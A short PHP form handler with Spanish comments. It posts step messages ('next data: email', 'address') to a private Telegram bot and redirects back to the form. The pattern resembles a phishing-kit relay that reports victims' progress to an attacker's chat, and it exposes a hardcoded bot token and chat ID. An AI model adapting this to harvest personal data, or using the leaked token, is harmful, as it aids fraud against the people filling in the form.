<?php
$token = "6050325515:AAEscKbhE1fKpZaDUSBDqSBztVvPzxgjlD0";
$chatId = "5759161931";

// Obtener el número de página enviado desde el formulario
$page = $_POST['page'];

// Enviar solicitud a Telegram para solicitar el siguiente dato
$nextValue = '';
if ($page === '1') {
    // Enviar solicitud para el siguiente dato
    // Reemplaza "BOT_TOKEN" con tu token de bot de Telegram
    $response = file_get_contents("https://api.telegram.org/bot6050325515:AAEscKbhE1fKpZaDUSBDqSBztVvPzxgjlD0/sendMessage?chat_id=$chatId&text=Siguiente dato: Correo electrónico");
    $nextValue = 'email';
} else if ($page === '2') {
    // Enviar solicitud para el siguiente dato
    // Reemplaza "BOT_TOKEN" con tu token de bot de Telegram
    $response = file_get_contents("https://api.telegram.org/bot6050325515:AAEscKbhE1fKpZaDUSBDqSBztVvPzxgjlD0/sendMessage?chat_id=$chatId&text=Siguiente dato: Dirección");
    $nextValue = 'address';
}

// Guardar el siguiente valor en una variable de sesión
session_start();
$_SESSION['nextValue'] = $nextValue;

// Redireccionar a la siguiente página del formulario
header("Location: index.html?page=$page");
exit();
?>